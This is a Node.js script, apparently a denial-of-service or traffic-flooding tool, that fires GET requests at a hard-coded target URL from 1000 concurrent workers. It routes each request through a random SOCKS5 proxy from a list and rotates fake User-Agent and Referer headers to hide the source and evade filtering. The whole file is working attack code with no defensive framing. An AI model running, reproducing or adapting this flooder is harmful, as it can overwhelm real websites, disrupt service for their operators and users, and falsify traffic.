const axios = require("axios")
const fs = require("fs")
const { SocksProxyAgent } = require("socks-proxy-agent")

let targetUrl = "https://request.countbot.win/"
let threads = 1000

function loadProxies() {
    const data = fs.readFileSync("socks5.txt", "utf-8")

    return data
        .split("\n")
        .map(p => p.trim())
        .filter(p => p && !p.startsWith("//"))
}

const proxyPool = loadProxies()

function getRandomProxy() {
    const random = proxyPool[Math.floor(Math.random() * proxyPool.length)]
    return `socks5://${random}`
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile Safari/604.1"
]

function getRandomUA() {
    return userAgents[Math.floor(Math.random() * userAgents.length)]
}

const url = new URL(targetUrl)
const origin = url.origin + "/"

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://search.yahoo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    origin
]

function getRandomReferer() {
    return referers[Math.floor(Math.random() * referers.length)]
}

let totalSent = 0

async function sendHTTPRequest() {
    const proxy = getRandomProxy()
    const ua = getRandomUA()
    const referer = getRandomReferer()
    const startTime = Date.now()

    try {
        const agent = new SocksProxyAgent(proxy)

        const res = await axios.get(targetUrl, {
            httpAgent: agent,
            httpsAgent: agent,
            timeout: 10000,
            headers: {
                "User-Agent": ua,
                "Referer": referer
            }
        })

        const latency = Date.now() - startTime
        totalSent++
        console.log(`[SUKSES] Status: ${res.status} | Latency: ${latency}ms | Total: ${totalSent}`)
    } catch (err) {
        console.log(`[GAGAL] ${err.message} | Total: ${totalSent}`)
    }
}

let activeRequests = 0
const maxConcurrent = threads

function worker() {
    if (activeRequests >= maxConcurrent) return
    
    activeRequests++
    sendHTTPRequest().finally(() => {
        activeRequests--
        setImmediate(worker)
    })
}

for (let i = 0; i < threads; i++) {
    worker()
}
